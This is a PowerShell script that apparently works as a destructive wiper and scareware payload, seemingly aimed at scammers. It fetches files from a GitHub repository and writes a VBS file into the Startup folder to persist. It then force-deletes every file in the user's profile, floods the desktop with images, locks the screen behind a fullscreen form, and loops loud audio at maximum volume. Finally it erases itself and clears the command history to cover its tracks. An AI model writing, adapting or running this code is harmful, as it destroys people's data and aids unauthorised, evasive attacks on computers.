# Download necessary files to super hidden folder
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/Pierogi/main/wallpaper.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/Pierogi/main/form.png" -outfile "$env:USERPROFILE\temp\f.png"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/Pierogi/main/sound.wav" -outfile "$env:USERPROFILE\temp\s.wav"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/Pierogi/main/GUI_persistence.vbs" -outfile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UXControl.vbs"
attrib +s +h "$env:USERPROFILE\temp";

# Delete all user files except GUI files
Get-ChildItem -Path $env:USERPROFILE\* -Recurse -exclude $env:USERPROFILE\temp* |
Select -ExpandProperty FullName |
Where {$_ -notlike '$env:USERPROFILE\temp\*'} |
sort length -Descending |
Remove-Item -r -force 

# Fill desktop with images
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/form.png" -outfile "$env:USERPROFILE\Desktop\Scammer.png"
$f = 0
WHILE($f -lt 500){
cp $env:USERPROFILE\Desktop\YOU_ARE_NEXT.png $env:USERPROFILE\Desktop\YOU_ARE_NEXT_$f.png
$f++
}

# Change wallpaper
Set-ItemProperty 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};

# Define speakervolume buttons
Function Set-SpeakerVolume

{ Param (
  [switch]$min,
  [switch]$max)
  $wshShell = new-object -com wscript.shell
  If ($min)
  {1..50 | % {$wshShell.SendKeys([char]174)}}
  ElseIf ($max)
  {1..50 | % {$wshShell.SendKeys([char]175)}}
  Else
  {$wshShell.SendKeys([char]173)} }


# Set max volume
Set-SpeakerVolume -Max
$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
$player.PlayLooping();

# Show fullscreen image
Add-Type -AssemblyName system.windows.Forms
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$Form = New-Object system.windows.forms.form
$form.TopMost = $true
$Image = [system.drawing.image]::FromFile("$env:USERPROFILE\temp\f.png")
$Form.BackgroundImage = $Image
$Form.BackgroundImageLayout = "Zoom"
$Form.ShowInTaskbar = $false;
$Form.BackColor = "#000000"
$Form.WindowState = 'Maximized'
$Form.MinimizeBox = $False
$Form.ControlBox = $False
$Form.ShowInTaskbar = $False
$Form.FormBorderStyle = 'None'
$Form.MaximizeBox = $False
$Form.Show();

# Remove script
Remove-Item -Path $MyInvocation.MyCommand.Source

# Remove Powershell history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;
$pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;

#Spamming volume up button
WHILE ($TRUE) {
	Set-SpeakerVolume -Max
};
